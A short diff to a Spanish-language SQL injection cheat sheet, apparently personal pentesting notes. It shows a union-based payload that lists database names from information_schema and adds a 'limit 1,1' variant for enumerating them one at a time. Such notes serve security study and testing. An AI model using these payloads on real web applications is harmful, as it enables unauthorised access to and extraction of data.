@@ -23,3 +23,5 @@ Para extraer la versión
 Para enumerar las bases de datos existentes
 `' union select 1,schema_name from information_schema.schemata-- -`
 
+No siempre se nos pueden volcar todas las bases de datos, por lo cual podemos usar 
+`' union select 1,schema_name from information_schema.schemata limit 1,1-- -`, donde vamos enumerando uno a uno las bases de datos
